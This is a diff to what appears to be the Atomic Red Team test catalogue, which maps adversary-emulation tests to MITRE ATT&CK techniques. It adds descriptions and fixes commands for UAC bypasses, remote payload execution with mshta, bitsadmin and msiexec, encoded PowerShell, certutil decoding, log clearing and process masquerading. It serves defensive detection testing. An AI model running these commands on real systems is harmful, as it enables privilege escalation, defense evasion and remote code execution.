@@ -752,7 +752,7 @@ persistence:
       - Host forensic analysis
       identifier: T1197
     atomic_tests:
-    - name: Download & Execute
+    - name: Bitsadmin Download (cmd)
       description: |
         This test simulates an adversary leveraging bitsadmin.exe to download
         and execute a payload
@@ -776,10 +776,12 @@ persistence:
         cleanup_command: 'del #{local_file} >nul 2>&1
 
 '
-    - name: Download & Execute via PowerShell BITS
+    - name: Bitsadmin Download (PowerShell)
       description: |
         This test simulates an adversary leveraging bitsadmin.exe to download
         and execute a payload leveraging PowerShell
+
+        Upon execution you will find a github markdown file downloaded to the Temp directory
       supported_platforms:
       - windows
       input_arguments:
@@ -1342,6 +1344,7 @@ persistence:
         Adversaries can take advantage of insecure library loading by PowerShell to load a vulnerable version
         of amsi.dll in order to bypass AMSI (Anti-Malware Scanning Interface)
         https://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/
+        Upon execution a file named updater.exe will be placed in the Temp folder, the test will open and close this prompt when run
       supported_platforms:
       - windows
       executor:
@@ -2819,10 +2822,9 @@ persistence:
           Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs" -ErrorAction Ignore
           Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs" -ErrorAction Ignore
     - name: Supicious jse file run from startup Folder
-      description: 'jse files can be placed in and ran from the startup folder to
-        maintain persistance
-
-'
+      description: |
+        jse files can be placed in and ran from the startup folder to maintain persistance.
+        Upon execution, "T1137 Hello, World JSE!" will be printed to the powershell session twice.
       supported_platforms:
       - windows
       executor:
@@ -2837,10 +2839,9 @@ persistence:
           Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse" -ErrorAction Ignore
           Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse" -ErrorAction Ignore
     - name: Supicious bat file run from startup Folder
-      description: 'bat files can be placed in and ran from the startup folder to
-        maintain persistance
-
-'
+      description: |
+        bat files can be placed in and executed from the startup folder to maintain persistance.
+        Upon execution, cmd will be run and immediately closed.
       supported_platforms:
       - windows
       executor:
@@ -3803,9 +3804,9 @@ persistence:
 
 '
     - name: PowerShell Registry RunOnce
-      description: 'RunOnce Key Persistence via PowerShell
-
-'
+      description: |
+        RunOnce Key Persistence via PowerShell
+        Upon execution, a new entry will be added to the runonce item in the registry
       supported_platforms:
       - windows
       input_arguments:
@@ -5340,7 +5341,7 @@ defense-evasion:
       - Host forensic analysis
       identifier: T1197
     atomic_tests:
-    - name: Download & Execute
+    - name: Bitsadmin Download (cmd)
       description: |
         This test simulates an adversary leveraging bitsadmin.exe to download
         and execute a payload
@@ -5364,10 +5365,12 @@ defense-evasion:
         cleanup_command: 'del #{local_file} >nul 2>&1
 
 '
-    - name: Download & Execute via PowerShell BITS
+    - name: Bitsadmin Download (PowerShell)
       description: |
         This test simulates an adversary leveraging bitsadmin.exe to download
         and execute a payload leveraging PowerShell
+
+        Upon execution you will find a github markdown file downloaded to the Temp directory
       supported_platforms:
       - windows
       input_arguments:
@@ -5595,11 +5598,10 @@ defense-evasion:
       - Windows User Account Control
       identifier: T1088
     atomic_tests:
-    - name: Bypass UAC using Event Viewer
-      description: 'Bypasses User Account Control using Event Viewer and a relevant
-        Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
-
-'
+    - name: Bypass UAC using Event Viewer (cmd)
+      description: |
+        Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
+        Upon execution command prompt should be launched with administrative privelages
       supported_platforms:
       - windows
       input_arguments:
@@ -5615,11 +5617,10 @@ defense-evasion:
         cleanup_command: 'reg.exe delete hkcu\software\classes\mscfile /f
 
 '
-    - name: Bypass UAC using Event Viewer - PowerShell
-      description: 'PowerShell code to bypass User Account Control using Event Viewer
-        and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
-
-'
+    - name: Bypass UAC using Event Viewer (PowerShell)
+      description: |
+        PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
+        Upon execution command prompt should be launched with administrative privelages
       supported_platforms:
       - windows
       input_arguments:
@@ -5683,11 +5684,10 @@ defense-evasion:
           -Recurse -ErrorAction Ignore
 
 '
-    - name: Bypass UAC using ComputerDefaults - PowerShell
-      description: 'PowerShell code to bypass User Account Control using ComputerDefaults.exe
-        on Windows 10
-
-'
+    - name: Bypass UAC using ComputerDefaults (PowerShell)
+      description: |
+        PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10
+        Upon execution administrative command prompt should open
       supported_platforms:
       - windows
       input_arguments:
@@ -5697,7 +5697,7 @@ defense-evasion:
           default: C:\Windows\System32\cmd.exe
       executor:
         name: powershell
-        elevation_required: false
+        elevation_required: true
         command: |
           New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
           New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
@@ -5708,11 +5708,9 @@ defense-evasion:
 
 '
     - name: Bypass UAC by Mocking Trusted Directories
-      description: 'Creates a fake "trusted directory" and copies a binary to bypass
-        UAC. The UAC bypass may not work on fully patched systems, however the directory
-        structure will be created.
-
-'
+      description: |
+        Creates a fake "trusted directory" and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems
+        Upon execution the directory structure should exist if the system is patched, if unpatched Microsoft Management Console should launch
       supported_platforms:
       - windows
       input_arguments:
@@ -5727,8 +5725,9 @@ defense-evasion:
           mkdir "\\?\C:\Windows \System32\"
           copy "#{executable_binary}" "\\?\C:\Windows \System32\mmc.exe"
           mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
-        cleanup_command: "rd \"\\\\?\\C:\\Windows \\\" /S /Q\ndel \"c:\\testbypass.exe\"
-          >nul 2>nul \n"
+        cleanup_command: |
+          rd "\\?\C:\Windows \" /S /Q
+          del "c:\testbypass.exe" >nul 2>nul
   T1191:
     technique:
       x_mitre_data_sources:
@@ -6039,7 +6038,9 @@ defense-evasion:
       identifier: T1500
     atomic_tests:
     - name: Compile After Delivery using csc.exe
-      description: "Compile C# code using csc.exe binary used by .NET \n"
+      description: |
+        Compile C# code using csc.exe binary used by .NET
+        Upon execution an exe named T1500.exe will be placed in the temp folder
       supported_platforms:
       - windows
       input_arguments:
@@ -6065,7 +6066,9 @@ defense-evasion:
           #{input_file}
 
 '
-        cleanup_command: 'del #{output_file} >nul 2>&1'
+        cleanup_command: 'del #{output_file} >nul 2>&1
+
+'
   T1223:
     technique:
       x_mitre_data_sources:
@@ -6131,9 +6134,9 @@ defense-evasion:
       identifier: T1223
     atomic_tests:
     - name: Compiled HTML Help Local Payload
-      description: 'Uses hh.exe to execute a local compiled HTML Help payload.
-
-'
+      description: |
+        Uses hh.exe to execute a local compiled HTML Help payload.
+        Upon execution calc.exe will open
       supported_platforms:
       - windows
       input_arguments:
@@ -6155,9 +6158,9 @@ defense-evasion:
 
 '
     - name: Compiled HTML Help Remote Payload
-      description: 'Uses hh.exe to execute a remote compiled HTML Help payload.
-
-'
+      description: |
+        Uses hh.exe to execute a remote compiled HTML Help payload.
+        Upon execution displays an error saying the file cannot be open
       supported_platforms:
       - windows
       input_arguments:
@@ -6254,8 +6257,9 @@ defense-evasion:
           unset https_proxy
     - name: portproxy reg key
       description: |
-        Adds a registry key to set up a proxy on the endpoint at
-        HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4
+        Adds a registry key to set up a proxy on the endpoint at HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4
+        Upon execution there will be a new proxy entry in netsh
+        netsh interface portproxy show all
       supported_platforms:
       - windows
       input_arguments:
@@ -6355,10 +6359,9 @@ defense-evasion:
       identifier: T1196
     atomic_tests:
     - name: Control Panel Items
-      description: 'This test simulates an adversary leveraging control.exe to execute
-        a payload and pops calc
-
-'
+      description: |
+        This test simulates an adversary leveraging control.exe
+        Upon execution calc.exe will be launched
       supported_platforms:
       - windows
       input_arguments:
@@ -6571,6 +6574,7 @@ defense-evasion:
         Adversaries can take advantage of insecure library loading by PowerShell to load a vulnerable version
         of amsi.dll in order to bypass AMSI (Anti-Malware Scanning Interface)
         https://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/
+        Upon execution a file named updater.exe will be placed in the Temp folder, the test will open and close this prompt when run
       supported_platforms:
       - windows
       executor:
@@ -6710,9 +6714,9 @@ defense-evasion:
       identifier: T1140
     atomic_tests:
     - name: Deobfuscate/Decode Files Or Information
-      description: 'Encode/Decode executable
-
-'
+      description: |
+        Encode/Decode executable
+        Upon execution a file named T1140_calc_decoded.exe will be placed in the temp folder
       supported_platforms:
       - windows
       input_arguments:
@@ -6725,7 +6729,7 @@ defense-evasion:
         elevation_required: false
         command: |
           certutil -encode #{executable} %temp%\T1140_calc.txt
-          certutil -decode %temp%\T1140_calc.txt %temp%T1140_calc_decoded.exe
+          certutil -decode %temp%\T1140_calc.txt %temp%\T1140_calc_decoded.exe
         cleanup_command: |
           del %temp%\T1140_calc.txt >nul 2>&1
           del %temp%T1140_calc_decoded.exe >nul 2>&1
@@ -6746,10 +6750,12 @@ defense-evasion:
         elevation_required: false
         command: |
           copy %windir%\system32\certutil.exe %temp%\tcm.tmp
-          %temp%\tcm.tmp -decode #{executable} %temp%\T1140.txt
+          %temp%\tcm.tmp -encode #{executable} %temp%\T1140_calc.txt
+          %temp%\tcm.tmp -decode %temp%\T1140_calc.txt %temp%\T1140_calc_decoded.exe
         cleanup_command: |
           del %temp%\tcm.tmp >nul 2>&1
-          del %temp%\T1140.txt >nul 2>&1
+          del %temp%\T1140_calc.txt >nul 2>&1
+          del %temp%T1140_calc_decoded.exe >nul 2>&1
   T1089:
     technique:
       x_mitre_data_sources:
@@ -8343,10 +8349,9 @@ defense-evasion:
       identifier: T1143
     atomic_tests:
     - name: Hidden Window
-      description: 'Launch PowerShell with the "-WindowStyle Hidden" argument to conceal
-        PowerShell windows by setting the WindowStyle parameter to hidden.
-
-'
+      description: |
+        Launch PowerShell with the "-WindowStyle Hidden" argument to conceal PowerShell windows by setting the WindowStyle parameter to hidden.
+        Upon execution a hidden PowerShell window will launch calc.exe
       supported_platforms:
       - windows
       input_arguments:
@@ -8577,7 +8582,7 @@ defense-evasion:
       identifier: T1070
     atomic_tests:
     - name: Clear Logs
-      description: 'Clear Windows Event Logs
+      description: 'Upon execution this test will clear Windows Event Logs
 
 '
       supported_platforms:
@@ -8741,8 +8746,8 @@ defense-evasion:
     - name: Indirect Command Execution - pcalua.exe
       description: |
         The Program Compatibility Assistant (pcalua.exe) may invoke the execution of programs and commands from a Command-Line Interface.
-
         [Reference](https://twitter.com/KyleHanslovan/status/912659279806640128)
+        Upon execution, calc.exe should open
       supported_platforms:
       - windows
       input_arguments:
@@ -8753,24 +8758,19 @@ defense-evasion:
         payload_path:
           description: Path to payload
           type: path
-          default: c:\temp\payload.dll
-        payload_cpl_path:
-          description: Path to payload
-          type: path
-          default: C:\Windows\system32\javacpl.cpl -c Java
+          default: C:\Windows\System32\calc.exe
       executor:
         name: command_prompt
+        elevation_required: false
         command: |
           pcalua.exe -a #{process}
           pcalua.exe -a #{payload_path}
-          pcalua.exe -a #{payload_cpl_path}
     - name: Indirect Command Execution - forfiles.exe
       description: |
         forfiles.exe may invoke the execution of programs and commands from a Command-Line Interface.
-
         [Reference](https://github.com/api0cradle/LOLBAS/blob/master/OSBinaries/Forfiles.md)
-
         "This is basically saying for each occurrence of notepad.exe in c:\windows\system32 run calc.exe"
+        Upon execution calc.exe will be opened
       supported_platforms:
       - windows
       input_arguments:
@@ -8780,6 +8780,7 @@ defense-evasion:
           default: calc.exe
       executor:
         name: command_prompt
+        elevation_required: false
         command: |
           forfiles /p c:\windows\system32 /m notepad.exe /c #{process}
           forfiles /p c:\windows\system32 /m notepad.exe /c "c:\folder\normal.dll:evil.exe"
@@ -9665,18 +9666,17 @@ defense-evasion:
       identifier: T1036
     atomic_tests:
     - name: Masquerading as Windows LSASS process
-      description: 'Copies cmd.exe, renames it, and launches it to masquerade as an
-        instance of lsass.exe.
-
-'
+      description: |
+        Copies cmd.exe, renames it, and launches it to masquerade as an instance of lsass.exe.
+        Upon execution, cmd will be launched by powershell. If using Invoke-AtomicTest, The test will hang until the 120 second timeout cancels the session
       supported_platforms:
       - windows
       executor:
         name: command_prompt
         elevation_required: false
         command: |
-          cmd.exe /c copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe
-          cmd.exe /c %SystemRoot%\Temp\lsass.exe
+          copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe
+          %SystemRoot%\Temp\lsass.exe /B
         cleanup_command: 'del /Q /F %SystemRoot%\Temp\lsass.exe >nul 2>&1
 
 '
@@ -9710,10 +9710,9 @@ defense-evasion:
 
 '
     - name: Masquerading - wscript.exe running as svchost.exe
-      description: 'Copies wscript.exe, renames it, and launches it to masquerade
-        as an instance of svchost.exe.
-
-'
+      description: |
+        Copies wscript.exe, renames it, and launches it to masquerade as an instance of svchost.exe.
+        Upon execution, no windows will remain open but wscript will have been renamed to svchost and ran out of the temp folder
       supported_platforms:
       - windows
       executor:
@@ -10066,7 +10065,8 @@ defense-evasion:
           $key = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\bad-domain.com\"
           Remove-item  $key -Recurse -ErrorAction Ignore
     - name: Javascript in registry
-      description: 'placing javascript in registry for persistence
+      description: 'Upon execution, a javascript block will be placed in the registry
+        for persistence
 
 '
       supported_platforms:
@@ -10078,8 +10078,10 @@ defense-evasion:
           Settings" -Name T1112 -Value "<script>"
 
 '
-        cleanup_command: Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet
+        cleanup_command: 'Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet
           Settings" -Name T1112 -ErrorAction Ignore
+
+'
   T1170:
     technique:
       x_mitre_data_sources:
@@ -10169,9 +10171,9 @@ defense-evasion:
       identifier: T1170
     atomic_tests:
     - name: Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject
-      description: 'Test execution of a remote script using mshta.exe
-
-'
+      description: |
+        Test execution of a remote script using mshta.exe
+        Upon execution calc.exe will be launched
       supported_platforms:
       - windows
       input_arguments:
@@ -10182,8 +10184,9 @@ defense-evasion:
       executor:
         name: command_prompt
         elevation_required: false
-        command: "mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
-          \     \n"
+        command: 'mshta.exe javascript:a=(GetObject(''script:#{file_url}'')).Exec();close();
+
+'
     - name: Mshta calls a local VBScript file to launch notepad.exe
       description: Tests execution of a local program by a VBScript file called by
         Mshta
@@ -10213,9 +10216,9 @@ defense-evasion:
 
 '
     - name: Mshta Executes Remote HTML Application (HTA)
-      description: 'Execute an arbitrary remote HTA.
-
-'
+      description: |
+        Execute an arbitrary remote HTA.
+        Upon execution calc.exe will be launched
       supported_platforms:
       - windows
       input_arguments:
@@ -10347,10 +10350,9 @@ defense-evasion:
           expand \\webdav\folder\file.bat #{path}\file.txt:file.bat
           esentutl.exe /y #{path}\autoruns.exe /d #{path}\file.txt:autoruns.exe /o
     - name: Store file in Alternate Data Stream (ADS)
-      description: 'Storing files in Alternate Data Stream (ADS) similar to Astaroth
-        malware.
-
-'
+      description: |
+        Storing files in Alternate Data Stream (ADS) similar to Astaroth malware.
+        Upon execution cmd will run and attempt to launch desktop.ini. No windows remain open after the test
       supported_platforms:
       - windows
       input_arguments:
@@ -10375,7 +10377,9 @@ defense-evasion:
               New-Item -ItemType Directory -Force -Path C:\Users\Public\Libraries\yanki
               }
           Start-Process -FilePath "$env:comspec" -ArgumentList "/c,type,#{payload_path},>,`"#{ads_file_path}:#{ads_name}`""
-        cleanup_command: Remove-Item "#{ads_file_path}" -Force -ErrorAction Ignore
+        cleanup_command: 'Remove-Item "#{ads_file_path}" -Force -ErrorAction Ignore
+
+'
   T1126:
     technique:
       x_mitre_data_sources:
@@ -10605,10 +10609,9 @@ defense-evasion:
           chmod +x /tmp/art.sh
           /tmp/art.sh
     - name: Execute base64-encoded PowerShell
-      description: 'Creates base64-encoded PowerShell code and executes it. This is
-        used by numerous adversaries and malicious tools.
-
-'
+      description: |
+        Creates base64-encoded PowerShell code and executes it. This is used by numerous adversaries and malicious tools.
+        Upon execution the test will print "Hey, Atomic!" to the PowerShell session
       supported_platforms:
       - windows
       input_arguments:
@@ -10624,14 +10627,11 @@ defense-evasion:
           $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
           $EncodedCommand =[Convert]::ToBase64String($Bytes)
           $EncodedCommand
-
           powershell.exe -EncodedCommand $EncodedCommand
     - name: Execute base64-encoded PowerShell from Windows Registry
-      description: 'Stores base64-encoded PowerShell code in the Windows Registry
-        and deobfuscates it for execution. This is used by numerous adversaries and
-        malicious tools.
-
-'
+      description: |
+        Stores base64-encoded PowerShell code in the Windows Registry and deobfuscates it for execution. This is used by numerous adversaries and malicious tools.
+        Upon execution "Hey, Atomic!" will be printed to the powershell session
       supported_platforms:
       - windows
       input_arguments:
@@ -10659,7 +10659,9 @@ defense-evasion:
           Set-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand
           powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))"
         cleanup_command: 'Remove-ItemProperty -Force -ErrorAction Ignore -Path #{registry_key_storage}
-          -Name #{registry_entry_storage}'
+          -Name #{registry_entry_storage}
+
+'
   T1502:
     technique:
       x_mitre_data_sources:
@@ -11680,8 +11682,8 @@ defense-evasion:
     - name: Rundll32 execute VBscript command
       description: |
         Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.
-
         Technique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/
+        Upon execution calc.exe will be launched
       supported_platforms:
       - windows
       input_arguments:
@@ -11698,8 +11700,8 @@ defense-evasion:
     - name: Rundll32 advpack.dll Execution
       description: |
         Test execution of a command using rundll32.exe with advpack.dll.
-
         Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml
+        Upon execution calc.exe will be launched
       supported_platforms:
       - windows
       input_arguments:
@@ -12082,6 +12084,7 @@ defense-evasion:
 '
     - name: Msiexec.exe - Execute Local MSI file
       description: 'Execute arbitrary MSI file. Commonly seen in application installation.
+        The MSI opens notepad.exe when sucessfully executed.
 
 '
       supported_platforms:
@@ -12103,7 +12106,8 @@ defense-evasion:
 '
     - name: Msiexec.exe - Execute Remote MSI file
       description: 'Execute arbitrary MSI file retrieved remotely. Less commonly seen
-        in application installation, commonly seen in malware execution.
+        in application installation, commonly seen in malware execution. The MSI opens
+        notepad.exe when sucessfully executed.
 
 '
       supported_platforms:
@@ -12112,7 +12116,7 @@ defense-evasion:
         msi_payload:
           description: MSI file to execute
           type: String
-          default: http://site.com/file.msi
+          default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218.msi
       executor:
         name: command_prompt
         command: 'msiexec.exe /q /i "#{msi_payload}"
@@ -13563,11 +13567,10 @@ privilege-escalation:
       - Windows User Account Control
       identifier: T1088
     atomic_tests:
-    - name: Bypass UAC using Event Viewer
-      description: 'Bypasses User Account Control using Event Viewer and a relevant
-        Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
-
-'
+    - name: Bypass UAC using Event Viewer (cmd)
+      description: |
+        Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
+        Upon execution command prompt should be launched with administrative privelages
       supported_platforms:
       - windows
       input_arguments:
@@ -13583,11 +13586,10 @@ privilege-escalation:
         cleanup_command: 'reg.exe delete hkcu\software\classes\mscfile /f
 
 '
-    - name: Bypass UAC using Event Viewer - PowerShell
-      description: 'PowerShell code to bypass User Account Control using Event Viewer
-        and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
-
-'
+    - name: Bypass UAC using Event Viewer (PowerShell)
+      description: |
+        PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
+        Upon execution command prompt should be launched with administrative privelages
       supported_platforms:
       - windows
       input_arguments:
@@ -13651,11 +13653,10 @@ privilege-escalation:
           -Recurse -ErrorAction Ignore
 
 '
-    - name: Bypass UAC using ComputerDefaults - PowerShell
-      description: 'PowerShell code to bypass User Account Control using ComputerDefaults.exe
-        on Windows 10
-
-'
+    - name: Bypass UAC using ComputerDefaults (PowerShell)
+      description: |
+        PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10
+        Upon execution administrative command prompt should open
       supported_platforms:
       - windows
       input_arguments:
@@ -13665,7 +13666,7 @@ privilege-escalation:
           default: C:\Windows\System32\cmd.exe
       executor:
         name: powershell
-        elevation_required: false
+        elevation_required: true
         command: |
           New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
           New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
@@ -13676,11 +13677,9 @@ privilege-escalation:
 
 '
     - name: Bypass UAC by Mocking Trusted Directories
-      description: 'Creates a fake "trusted directory" and copies a binary to bypass
-        UAC. The UAC bypass may not work on fully patched systems, however the directory
-        structure will be created.
-
-'
+      description: |
+        Creates a fake "trusted directory" and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems
+        Upon execution the directory structure should exist if the system is patched, if unpatched Microsoft Management Console should launch
       supported_platforms:
       - windows
       input_arguments:
@@ -13695,8 +13694,9 @@ privilege-escalation:
           mkdir "\\?\C:\Windows \System32\"
           copy "#{executable_binary}" "\\?\C:\Windows \System32\mmc.exe"
           mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
-        cleanup_command: "rd \"\\\\?\\C:\\Windows \\\" /S /Q\ndel \"c:\\testbypass.exe\"
-          >nul 2>nul \n"
+        cleanup_command: |
+          rd "\\?\C:\Windows \" /S /Q
+          del "c:\testbypass.exe" >nul 2>nul
   T1038:
     technique:
       x_mitre_permissions_required:
@@ -13804,6 +13804,7 @@ privilege-escalation:
         Adversaries can take advantage of insecure library loading by PowerShell to load a vulnerable version
         of amsi.dll in order to bypass AMSI (Anti-Malware Scanning Interface)
         https://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/
+        Upon execution a file named updater.exe will be placed in the Temp folder, the test will open and close this prompt when run
       supported_platforms:
       - windows
       executor:
@@ -16813,9 +16814,9 @@ discovery:
           dscacheutil -q group
           dscacheutil -q user
     - name: Enumerate all accounts
-      description: 'Enumerate all accounts
-
-'
+      description: |
+        Enumerate all accounts
+        Upon exection, multiple enumeration commands will be run and their output displayed in the PowerShell session
       supported_platforms:
       - windows
       executor:
@@ -17591,9 +17592,9 @@ discovery:
           smbutil view -g //#{computer_name}
           showmount #{computer_name}
     - name: Network Share Discovery command prompt
-      description: 'Network Share Discovery utilizing the command prompt
-
-'
+      description: |
+        Network Share Discovery utilizing the command prompt. The computer name variable may need to be modified to point to a different host
+        Upon execution avalaible network shares will be displayed in the powershell session
       supported_platforms:
       - windows
       input_arguments:
@@ -17608,9 +17609,9 @@ discovery:
 
 '
     - name: Network Share Discovery PowerShell
-      description: 'Network Share Discovery utilizing PowerShell
-
-'
+      description: |
+        Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host
+        Upon execution, avalaible network shares will be displayed in the powershell session
       supported_platforms:
       - windows
       input_arguments:
@@ -17626,7 +17627,8 @@ discovery:
           get-smbshare -Name #{computer_name}
     - name: View available share drives
       description: View information about all of the resources that are shared on
-        the local computer
+        the local computer Upon execution, avalaible share drives will be displayed
+        in the powershell session
       supported_platforms:
       - windows
       executor:
@@ -21630,9 +21632,9 @@ execution:
       identifier: T1223
     atomic_tests:
     - name: Compiled HTML Help Local Payload
-      description: 'Uses hh.exe to execute a local compiled HTML Help payload.
-
-'
+      description: |
+        Uses hh.exe to execute a local compiled HTML Help payload.
+        Upon execution calc.exe will open
       supported_platforms:
       - windows
       input_arguments:
@@ -21654,9 +21656,9 @@ execution:
 
 '
     - name: Compiled HTML Help Remote Payload
-      description: 'Uses hh.exe to execute a remote compiled HTML Help payload.
-
-'
+      description: |
+        Uses hh.exe to execute a remote compiled HTML Help payload.
+        Upon execution displays an error saying the file cannot be open
       supported_platforms:
       - windows
       input_arguments:
@@ -21805,10 +21807,9 @@ execution:
       identifier: T1196
     atomic_tests:
     - name: Control Panel Items
-      description: 'This test simulates an adversary leveraging control.exe to execute
-        a payload and pops calc
-
-'
+      description: |
+        This test simulates an adversary leveraging control.exe
+        Upon execution calc.exe will be launched
       supported_platforms:
       - windows
       input_arguments:
@@ -22854,9 +22855,9 @@ execution:
       identifier: T1170
     atomic_tests:
     - name: Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject
-      description: 'Test execution of a remote script using mshta.exe
-
-'
+      description: |
+        Test execution of a remote script using mshta.exe
+        Upon execution calc.exe will be launched
       supported_platforms:
       - windows
       input_arguments:
@@ -22867,8 +22868,9 @@ execution:
       executor:
         name: command_prompt
         elevation_required: false
-        command: "mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
-          \     \n"
+        command: 'mshta.exe javascript:a=(GetObject(''script:#{file_url}'')).Exec();close();
+
+'
     - name: Mshta calls a local VBScript file to launch notepad.exe
       description: Tests execution of a local program by a VBScript file called by
         Mshta
@@ -22898,9 +22900,9 @@ execution:
 
 '
     - name: Mshta Executes Remote HTML Application (HTA)
-      description: 'Execute an arbitrary remote HTA.
-
-'
+      description: |
+        Execute an arbitrary remote HTA.
+        Upon execution calc.exe will be launched
       supported_platforms:
       - windows
       input_arguments:
@@ -23030,9 +23032,9 @@ execution:
 
 '
     - name: BloodHound
-      description: 'Download Bloodhound and run it
-
-'
+      description: "Upon execution BloodHound will be downloaded and executed. It
+        will set up collection methods, run,\n\nand then compress and store the data
+        to the temp directory on the machine \n"
       supported_platforms:
       - windows
       input_arguments:
@@ -23086,6 +23088,7 @@ execution:
       description: |
         Note: Windows 10 only
         Bypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/
+        Upon execution windows backup and restore window will be opened
       supported_platforms:
       - windows
       executor:
@@ -23623,8 +23626,8 @@ execution:
     - name: Rundll32 execute VBscript command
       description: |
         Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.
-
         Technique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/
+        Upon execution calc.exe will be launched
       supported_platforms:
       - windows
       input_arguments:
@@ -23641,8 +23644,8 @@ execution:
     - name: Rundll32 advpack.dll Execution
       description: |
         Test execution of a command using rundll32.exe with advpack.dll.
-
         Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml
+        Upon execution calc.exe will be launched
       supported_platforms:
       - windows
       input_arguments:
@@ -24304,6 +24307,7 @@ execution:
 '
     - name: Msiexec.exe - Execute Local MSI file
       description: 'Execute arbitrary MSI file. Commonly seen in application installation.
+        The MSI opens notepad.exe when sucessfully executed.
 
 '
       supported_platforms:
@@ -24325,7 +24329,8 @@ execution:
 '
     - name: Msiexec.exe - Execute Remote MSI file
       description: 'Execute arbitrary MSI file retrieved remotely. Less commonly seen
-        in application installation, commonly seen in malware execution.
+        in application installation, commonly seen in malware execution. The MSI opens
+        notepad.exe when sucessfully executed.
 
 '
       supported_platforms:
@@ -24334,7 +24339,7 @@ execution:
         msi_payload:
           description: MSI file to execute
           type: String
-          default: http://site.com/file.msi
+          default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218.msi
       executor:
         name: command_prompt
         command: 'msiexec.exe /q /i "#{msi_payload}"
@@ -25124,33 +25129,33 @@ execution:
       identifier: T1047
     atomic_tests:
     - name: WMI Reconnaissance Users
-      description: 'WMI List User Accounts
-
-'
+      description: "An adversary might use WMI to list all local User Accounts. \nWhen
+        the test completes , there should be local user accounts information displayed
+        on the command line.\n"
       supported_platforms:
       - windows
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'wmic useraccount get /ALL
+        command: 'wmic useraccount get /ALL /format:csv
 
 '
     - name: WMI Reconnaissance Processes
-      description: 'WMI List Processes
-
-'
+      description: |
+        An adversary might use WMI to list Processes running on the compromised host.
+        When the test completes , there should be running processes listed on the command line.
       supported_platforms:
       - windows
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'wmic process get caption,executablepath,commandline
+        command: 'wmic process get caption,executablepath,commandline /format:csv
 
 '
     - name: WMI Reconnaissance Software
-      description: 'WMI List Software
-
-'
+      description: |
+        An adversary might use WMI to list installed Software hotfix and patches.
+        When the test completes, there should be a list of installed patches and when they were installed.
       supported_platforms:
       - windows
       executor:
@@ -25160,63 +25165,74 @@ execution:
 
 '
     - name: WMI Reconnaissance List Remote Services
